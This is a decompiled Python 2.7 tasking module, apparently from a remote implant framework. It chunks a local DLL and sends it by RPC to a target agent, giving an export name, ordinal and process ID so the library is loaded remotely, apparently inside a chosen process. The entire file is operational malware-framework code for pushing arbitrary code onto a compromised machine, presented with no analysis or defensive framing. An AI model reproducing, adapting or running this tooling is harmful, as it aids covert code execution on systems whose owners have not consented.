# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DllLoad_Tasking.py
UPLOADS_DIR = 'Uploads'
MAX_CHUNK_SIZE = 1047552

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.env
    import mcl.tasking.resource
    import mcl.tasking.technique
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.install.cmd.dllload', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.install.cmd.dllload.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['chunksize'] == 0 or lpParams['chunksize'] >= MAX_CHUNK_SIZE:
        mcl.tasking.OutputError('Invalid chunkSize given')
        return False
    else:
        if lpParams['nowait']:
            mcl.tasking.env.SetValue(mca.install.cmd.dllload.LP_ENV_DLLLOAD_NOWAIT, 'true')
        if lpParams['export'] != None and len(lpParams['export']) > 0:
            exportName = lpParams['export']
        else:
            exportName = ''
        if lpParams['library'] == None or len(lpParams['library']) == 0:
            mcl.tasking.OutputError('No local file given')
            return False
        local = lpParams['library']
        resFlags = 0
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_ARCH
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_OS
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_LIBC
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_COMPILED
        f, openedName, usedProject = mcl.tasking.resource.Open(local, resFlags, UPLOADS_DIR, lpParams['project'])
        if f == None:
            mcl.tasking.OutputError("Failed to open local file '%s'" % local)
            return False
        try:
            import os.path
            import array
            fileSize = os.path.getsize(openedName)
            if fileSize == 0 or fileSize > 4294967295L:
                mcl.tasking.OutputError("Unable to get file size for '%s'" % openedName)
                return False
            from mcl.object.XmlOutput import XmlOutput
            xml = XmlOutput()
            xml.Start('Dll')
            xml.AddAttribute('name', openedName)
            xml.AddAttribute('size', '%u' % fileSize)
            mcl.tasking.OutputXml(xml)
            fileBytes = array.array('B', f.read())
            if len(fileBytes) != fileSize:
                mcl.tasking.OutputError('Failed to read file (read=%u | expected=%u)' % (len(fileBytes), fileSize))
                return False
        finally:
            f.close()
            f = None

        onIndex = 0
        bytesLeft = fileSize
        while bytesLeft > 0:
            if mcl.CheckForStop():
                return False
            if bytesLeft > lpParams['chunksize']:
                bytesToSend = lpParams['chunksize']
            else:
                bytesToSend = bytesLeft
            startIndex = fileSize - bytesLeft
            endIndex = startIndex + bytesToSend
            tgtParams = mca.install.cmd.dllload.Params()
            tgtParams.chunkOffset = onIndex
            tgtParams.totalSize = fileSize
            tgtParams.chunk = fileBytes[startIndex:endIndex]
            tgtParams.exportName = exportName
            tgtParams.ordinal = lpParams['ordinal']
            tgtParams.pid = lpParams['pid']
            rpc = mca.install.cmd.dllload.tasking.RPC_INFO_LOAD
            msg = MarshalMessage()
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
            rpc.SetMessagingType('message')
            from mcl.object.XmlOutput import XmlOutput
            xml = XmlOutput()
            xml.Start('DllSend')
            xml.AddAttribute('chunkIndex', '%u' % tgtParams.chunkOffset)
            xml.AddAttribute('chunkSize', '%u' % len(tgtParams.chunk))
            xml.AddAttribute('totalSize', '%u' % tgtParams.totalSize)
            mcl.tasking.OutputXml(xml)
            res = mcl.tasking.RpcPerformCall(rpc)
            if res != mcl.target.CALL_SUCCEEDED:
                mcl.tasking.RecordModuleError(res, 0, mca.install.cmd.dllload.errorStrings)
                return False
            bytesLeft = bytesLeft - bytesToSend
            onIndex = onIndex + bytesToSend

        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)